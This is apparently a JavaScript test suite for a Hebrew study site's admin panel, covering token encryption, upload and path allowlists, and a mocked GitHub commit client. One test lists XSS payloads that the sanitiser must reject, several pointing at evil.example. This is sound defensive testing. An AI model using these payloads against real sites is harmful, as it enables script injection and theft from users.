import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { seal, open, passwordProblems, backoffMs, looksLikeToken } from '../js/admin/vault.js';
import { checkUpload, checkVideo, isWritablePath, isValidId, withSummaryAccent } from '../js/admin/uploads.js';
import { createGithub, ConflictError } from '../js/admin/github.js';
import { planQuiz, planSummary, planCatalog, planQuizDelete, detectQuizFormat } from '../js/admin/actions.js';
import { pageErrors } from '../js/summary-check.js';
import { validateCatalog } from '../js/catalog.js';

const FAST = { iterations: 200_000 };
const bytes = (s) => new TextEncoder().encode(s);

// ---------- vault ----------
test('vault: round trip, wrong password, tampering', async () => {
  const token = 'github_pat_' + 'A'.repeat(30);
  const sealed = await seal(token, 'correct horse 1234', FAST);
  assert.ok(!JSON.stringify(sealed).includes(token), 'ciphertext must not contain the token');
  assert.equal(await open(sealed, 'correct horse 1234'), token);
  await assert.rejects(open(sealed, 'wrong password 1234'), /סיסמה שגויה/);
  await assert.rejects(open({ ...sealed, iter: 200_001 }, 'correct horse 1234'), /סיסמה שגויה/, 'iterations are authenticated');
  const flipped = { ...sealed, ct: sealed.ct.slice(0, -4) + (sealed.ct.endsWith('AAAA') ? 'BBBB' : 'AAAA') };
  await assert.rejects(open(flipped, 'correct horse 1234'));
  await assert.rejects(open({ ...sealed, iter: 1 }, 'correct horse 1234'), 'downgrade rejected');
  await assert.rejects(open(null, 'x'));
});

test('vault: password rules, backoff, token shape', () => {
  assert.ok(passwordProblems('short1').length > 0);
  assert.ok(passwordProblems('onlyletterslong').length > 0);
  assert.deepEqual(passwordProblems('Fine-pass-4-me-ok'), []);
  assert.equal(backoffMs(2), 0);
  assert.ok(backoffMs(6) > backoffMs(4));
  assert.ok(backoffMs(99) <= 60_000);
  assert.ok(looksLikeToken('github_pat_' + 'a'.repeat(30)));
  assert.ok(!looksLikeToken('hello world'));
});

// ---------- uploads / paths ----------
test('paths: only allowlisted targets, no traversal', () => {
  for (const ok of ['quizzes/heart-1.json', 'quizzes/manifest.json', 'summaries/new-one.html', 'summaries/list.json', 'css/summary.css']) {
    assert.ok(isWritablePath(ok), ok);
  }
  for (const bad of ['../x.json', 'quizzes/../index.html', 'index.html', 'js/core.js', 'quizzes/A.json', 'quizzes/a/b.json',
    '/quizzes/a.json', 'quizzes\\a.json', 'admin/index.html', '.github/workflows/check.yml', 'summaries/index.html', 'summaries/all.html']) {
    assert.ok(!isWritablePath(bad), bad);
  }
  assert.ok(isValidId('heart-2') && !isValidId('Heart') && !isValidId('a/b') && !isValidId('-a') && !isValidId('a'.repeat(65)));
});

test('uploads: extension and content must agree', () => {
  const j = (name, text, size = text.length) => checkUpload({ name, size, bytes: bytes(text) });
  assert.deepEqual(j('q.json', '{"a":1}').errors, []);
  assert.ok(j('q.json', '<html>').errors.length > 0, 'html renamed to json');
  assert.ok(j('q.exe', '{}').errors.length > 0);
  assert.ok(j('q.svg', '<svg>').errors.length > 0);
  assert.ok(j('../q.json', '{}').errors.length > 0);
  assert.ok(j('q.json', '{}', 6 * 1024 * 1024).errors.length > 0, 'too big');
  assert.deepEqual(j('s.html', '<!doctype html><html>').errors, []);
  assert.ok(j('s.html', 'MZ\u0000\u0000binary').errors.length > 0);
  assert.ok(checkVideo({ name: 'a.mp4', size: 10, bytes: bytes('....ftypisom') }).length === 0);
  assert.ok(checkVideo({ name: 'a.mp4', size: 10, bytes: bytes('MZ..not-mp4!!') }).length > 0);
  assert.ok(checkVideo({ name: 'a.mp4', size: 200 * 1024 * 1024, bytes: bytes('....ftypisom') }).length > 0);
});

test('summary accent: inserted once, before the generic rule, injection-proof', async () => {
  const css = await readFile(new URL('../css/summary.css', import.meta.url), 'utf8');
  const out = withSummaryAccent(css, 'new-one', 120);
  assert.ok(out.includes('[data-system="new-one"]'));
  assert.ok(out.indexOf('[data-system="new-one"]') < out.indexOf('[data-system] { --accent: var(--a)'));
  assert.equal(withSummaryAccent(out, 'new-one', 5), out);
  assert.throws(() => withSummaryAccent(css, '"] { x', 1));
  assert.ok(withSummaryAccent(css, 'x1', '120; } body { display:none').includes('hsl(0 '), 'hue is coerced to a number');
});

// ---------- hostile summary HTML ----------
const page = (body, head = '') => `<!doctype html><html><head>${head}
<script type="module" src="../js/a11y.js"></script></head><body><button data-print>x</button>
<article class="summary" data-system="t">${body}</article>
<footer><a href="../accessibility.html">א</a><a href="../privacy.html">פ</a></footer></body></html>`;
const bad = (body, head) => pageErrors(page(body, head), { id: 't', isSummary: true });

test('hostile HTML corpus is rejected; clean content passes', () => {
  assert.deepEqual(bad('<p>שלום <b>עולם</b></p><svg viewBox="0 0 1 1" aria-hidden="true"><path d="M0 0"/></svg>'), []);
  const attacks = [
    '<script>alert(1)</script>',
    '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
    '<script src="../js/admin/app.js"></script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)></svg>',
    '<svg/onload=alert(1)>',
    '<a href="javascript:alert(1)">x</a>',
    '<a href=" JaVa\tScRiPt:alert(1)">x</a>',
    '<a href="jav&#x61;script:alert(1)">x</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
    '<iframe src="../index.html"></iframe>',
    '<iframe srcdoc="<script>1</script>"></iframe>',
    '<object data="x.swf"></object>',
    '<embed src="x">',
    '<form action="https://evil.example"><input name=p></form>',
    '<svg><foreignObject><p>x</p></foreignObject></svg>',
    '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>',
    '<p style="position:fixed;inset:0">overlay</p>',
    '<style>body{display:none}</style>',
    '<math><mtext></mtext></math>',
    '<video src="x.mp4"></video>',
    '<base href="https://evil.example/">',
    '<a href="//evil.example">x</a>',
    '<p>x</p><div onclick = "1">',
  ];
  for (const a of attacks) assert.ok(bad(a).length > 0, `should reject: ${a}`);
  assert.ok(bad('<p>x</p>', '<link rel="stylesheet" href="https://evil.example/a.css">').length > 0);
  assert.ok(bad('<p>x</p>', '<meta http-equiv="refresh" content="0;url=https://evil.example">').length > 0);
});

// ---------- fake GitHub ----------
function fakeGithub({ conflictsBeforeOk = 0, files = {} } = {}) {
  const log = [];
  let head = 'c1';
  let conflicts = conflictsBeforeOk;
  const fetchImpl = async (url, init) => {
    const u = new URL(url);
    log.push({ host: u.host, method: init.method, path: u.pathname, auth: init.headers.Authorization, body: init.body });
    const reply = (obj, status = 200) => ({ ok: status < 300, status, json: async () => obj });
    const p = u.pathname.replace('/repos/o/r', '');
    if (p === '/git/ref/heads/main') return reply({ object: { sha: head } });
    if (p.startsWith('/git/commits/') && init.method === 'GET') return reply({ tree: { sha: `t-${head}` } });
    if (p.startsWith('/git/trees/') && init.method === 'GET') {
      return reply({ truncated: false, tree: Object.keys(files).map((path) => ({ path, type: 'blob' })) });
    }
    if (p.startsWith('/contents/')) {
      const f = decodeURIComponent(p.slice('/contents/'.length));
      return files[f] === undefined ? reply({}, 404) : reply({ encoding: 'base64', content: Buffer.from(files[f]).toString('base64') });
    }
    if (p === '/git/blobs') return reply({ sha: `b${log.length}` });
    if (p === '/git/trees') return reply({ sha: `nt${log.length}` });
    if (p === '/git/commits') return reply({ sha: `nc${log.length}` });
    if (p === '/git/refs/heads/main') {
      if (conflicts > 0) { conflicts -= 1; head = `moved${conflicts}`; return reply({}, 422); }
      return reply({});
    }
    return reply({}, 404);
  };
  return { fetchImpl, log };
}

test('github: atomic commit; token only in the Authorization header to api.github.com', async () => {
  const { fetchImpl, log } = fakeGithub({ files: { 'quizzes/a.json': '{"id":"a"}' } });
  const token = 'github_pat_SECRET_SECRET_SECRET';
  const gh = createGithub({ token, owner: 'o', repo: 'r', fetchImpl });
  const { sha } = await gh.change(async ({ readText }) => {
    assert.equal(await readText('quizzes/a.json'), '{"id":"a"}');
    return { files: [{ path: 'quizzes/b.json', text: 'שלום' }], deletes: ['quizzes/a.json'] };
  }, 'msg');
  assert.ok(sha);
  assert.ok(log.every((r) => r.host === 'api.github.com'));
  assert.ok(log.every((r) => r.auth === `Bearer ${token}`));
  assert.ok(log.every((r) => !r.path.includes('SECRET') && !(r.body ?? '').includes('SECRET')));
  const treeCall = log.find((r) => r.path.endsWith('/git/trees') && r.method === 'POST');
  assert.deepEqual(JSON.parse(treeCall.body).tree.map((t) => [t.path, t.sha === null]), [['quizzes/b.json', false], ['quizzes/a.json', true]]);
  assert.equal(log.filter((r) => r.path.endsWith('/git/commits') && r.method === 'POST').length, 1, 'one commit');
  assert.equal(JSON.parse(log.at(-1).body).force, false, 'never force-pushes');
});

test('github: retries from the new head on conflict, then gives up', async () => {
  const ok = fakeGithub({ conflictsBeforeOk: 1 });
  let builds = 0;
  await createGithub({ token: 't', owner: 'o', repo: 'r', fetchImpl: ok.fetchImpl })
    .change(async () => { builds += 1; return { files: [{ path: 'quizzes/x.json', text: '{}' }] }; }, 'm');
  assert.equal(builds, 2);
  const stuck = fakeGithub({ conflictsBeforeOk: 9 });
  await assert.rejects(
    createGithub({ token: 't', owner: 'o', repo: 'r', fetchImpl: stuck.fetchImpl })
      .change(async () => ({ files: [{ path: 'quizzes/x.json', text: '{}' }] }), 'm', 2),
    ConflictError,
  );
});

test('github: refuses non-allowlisted paths and bad repo names; maps errors to Hebrew', async () => {
  const { fetchImpl } = fakeGithub();
  const gh = createGithub({ token: 't', owner: 'o', repo: 'r', fetchImpl });
  await assert.rejects(gh.change(async () => ({ files: [{ path: 'index.html', text: 'x' }] }), 'm'), /path not allowed/);
  await assert.rejects(gh.change(async () => ({ files: [{ path: '.github/workflows/x.yml', text: 'x' }] }), 'm'), /path not allowed/);
  assert.throws(() => createGithub({ token: 't', owner: '../x', repo: 'r' }), /bad repository/);
  const denied = createGithub({ token: 't', owner: 'o', repo: 'r', fetchImpl: async () => ({ ok: false, status: 401 }) });
  await assert.rejects(denied.head(), /הטוקן/);
});

// ---------- plans ----------
const catalog = { subjects: [{ name: 'מקצוע', units: ['יחידה'] }] };
const authoring = (id = 'new-quiz') => ({
  id, subject: 'מקצוע', unit: 'יחידה', title: 'מבחן חדש',
  questions: [{
    id: 'q1', topic: 'נושא', question: 'שאלה לדוגמה?', options: ['תשובה 1', 'תשובה 2', 'תשובה 3', 'תשובה 4'],
    correctIndex: 1, explanation: 'הסבר', wrongExplanations: ['למה לא 1', 'למה לא 3', 'למה לא 4'],
  }],
});

test('plan quiz: authoring format converted, manifest refreshed, duplicates and bad placement refused', () => {
  assert.equal(detectQuizFormat(authoring()), 'authoring');
  const plan = planQuiz({ source: authoring(), catalog, quizzes: [] });
  assert.deepEqual(plan.errors, []);
  assert.deepEqual(plan.files.map((f) => f.path), ['quizzes/new-quiz.json', 'quizzes/manifest.json']);
  const stored = JSON.parse(plan.files[0].text);
  assert.equal(stored.questions[0].correct, 1);
  assert.equal(JSON.parse(plan.files[1].text).subjects[0].units[0].quizzes[0].id, 'new-quiz');

  const again = planQuiz({ source: authoring(), catalog, quizzes: [stored] });
  assert.ok(again.errors.some((e) => /כבר קיים/.test(e)));
  assert.deepEqual(planQuiz({ source: authoring(), catalog, quizzes: [stored], replace: true }).errors, []);
  assert.ok(planQuiz({ source: authoring(), overrides: { unit: 'אין כזו' }, catalog, quizzes: [] }).errors.length > 0);
  assert.ok(planQuiz({ source: authoring('../evil'), catalog, quizzes: [] }).errors.length > 0);
  assert.ok(planQuiz({ source: { questions: 'x' }, catalog, quizzes: [] }).errors.length > 0);
  const hasExtra = { ...stored, id: 'other', isAdmin: true };
  assert.ok(planQuiz({ source: hasExtra, catalog, quizzes: [] }).errors.length > 0, 'unknown keys rejected');
});

test('plan catalog: cannot orphan a quiz; delete refreshes the manifest', () => {
  const quiz = JSON.parse(planQuiz({ source: authoring(), catalog, quizzes: [] }).files[0].text);
  assert.ok(planCatalog({ catalog: { subjects: [{ name: 'מקצוע', units: ['אחרת'] }] }, quizzes: [quiz] }).errors.length > 0);
  const ok = planCatalog({ catalog: { subjects: [{ name: 'מקצוע', units: ['יחידה', 'חדשה'] }] }, quizzes: [quiz] });
  assert.deepEqual(ok.errors, []);
  assert.ok(planCatalog({ catalog: { subjects: [] }, quizzes: [] }).errors.length > 0);
  const del = planQuizDelete({ id: 'new-quiz', catalog, quizzes: [quiz] });
  assert.deepEqual(del.deletes, ['quizzes/new-quiz.json']);
  assert.ok(planQuizDelete({ id: 'nope', catalog, quizzes: [quiz] }).errors.length > 0);
});

test('plan summary: html + list + accent together; hostile html and duplicates refused', async () => {
  const css = await readFile(new URL('../css/summary.css', import.meta.url), 'utf8');
  const list = JSON.parse(await readFile(new URL('../summaries/list.json', import.meta.url), 'utf8'));
  const good = page('<p>תוכן</p>').replace('data-system="t"', 'data-system="new-sum"');
  const plan = planSummary({ html: good, id: 'new-sum', title: 'חדש', blurb: 'תיאור', hue: 200, list, css });
  assert.deepEqual(plan.errors, []);
  assert.deepEqual(plan.files.map((f) => f.path), ['summaries/new-sum.html', 'summaries/list.json', 'css/summary.css']);
  assert.equal(JSON.parse(plan.files[1].text).summaries.at(-1).id, 'new-sum');

  const evil = planSummary({ html: good.replace('<p>', '<script>alert(1)</script><p>'), id: 'new-sum', title: 't', blurb: 'b', hue: 1, list, css });
  assert.ok(evil.errors.length > 0 && evil.files.length === 0);
  assert.ok(planSummary({ html: good, id: 'cardiovascular', title: 't', blurb: 'b', list, css }).errors.length > 0, 'duplicate');
  assert.ok(planSummary({ html: good, id: 'index', title: 't', blurb: 'b', list, css }).errors.length > 0, 'html id mismatch');
  assert.ok(planSummary({ html: good, id: '../x', title: 't', blurb: 'b', list, css }).errors.length > 0);
});

// ---------- templates stay valid ----------
test('every template passes the same validators the panel uses', async () => {
  const read = (f) => readFile(new URL(`../templates/${f}`, import.meta.url), 'utf8');
  const catalog = JSON.parse(await read('subjects.json'));
  assert.deepEqual(validateCatalog(catalog), []);
  const quizzes = [];
  for (const f of ['quiz-authoring.json', 'quiz-site.json']) {
    const plan = planQuiz({ source: JSON.parse(await read(f)), catalog, quizzes });
    assert.deepEqual(plan.errors, [], f);
    quizzes.push(JSON.parse(plan.files[0].text));
  }
  const css = await readFile(new URL('../css/summary.css', import.meta.url), 'utf8');
  const list = { summaries: [] };
  const plan = planSummary({ html: await read('summary.html'), id: 'my-new-summary', title: 'כותרת', blurb: 'תיאור', hue: 10, list, css });
  assert.deepEqual(plan.errors, []);
  assert.ok(plan.files[0].text.includes('data-system="my-new-summary"'), 'data-system follows the chosen id');
});

test('reserved ids cannot be taken by quizzes or summaries', () => {
  for (const id of ['manifest', 'subjects', 'index', 'all', 'list']) {
    assert.ok(!isValidId(id), id);
    assert.ok(planQuiz({ source: authoring(id), catalog, quizzes: [] }).errors.length > 0, id);
  }
});
